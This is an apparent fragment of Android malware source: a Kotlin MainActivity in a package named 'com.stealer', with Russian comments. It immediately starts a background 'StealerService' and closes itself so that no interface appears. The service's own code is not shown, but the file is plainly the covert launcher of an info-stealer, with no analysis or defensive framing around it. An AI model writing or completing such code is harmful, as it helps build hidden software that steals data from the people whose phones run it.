package com.stealer

import android.content.Intent
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle

class MainActivity : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        // Сразу запускаем сервис
        val serviceIntent = Intent(this, StealerService::class.java)
        startService(serviceIntent)
        
        // Закрываем активити
        finish()
    }
}
